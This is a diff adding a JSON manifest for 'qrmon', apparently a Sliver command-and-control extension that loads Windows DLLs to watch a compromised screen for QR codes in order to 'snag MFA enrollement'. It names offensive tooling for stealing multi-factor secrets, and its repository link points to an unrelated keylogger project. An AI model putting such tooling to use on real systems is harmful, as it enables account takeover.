@@ -1,0 +1,23 @@
+{
+  "name": "qrmon",
+  "version": "1.0.0",
+  "command_name": "qrmon",
+  "extension_author": "smeukinou",
+  "original_author": "smeukinou",
+  "repo_url": "https://github.com/sliverarmory/SliverKeylogger",
+  "help": "Monitor screen for QRCode, useful to snag MFA enrollement",
+  "long_help": "Monitor screen for QRCode, useful to snag MFA enrollement\n\t0 = stop\n\t1 = start\n\t2 = get results",
+  "entrypoint": "monitor",
+  "files": [
+    {
+      "os": "windows",
+      "arch": "amd64",
+      "path": "QRGrabber.x64.dll"
+    },
+    {
+      "os": "windows",
+      "arch": "386",
+      "path": "QRGrabber.x86.dll"
+    }
+  ]
+}
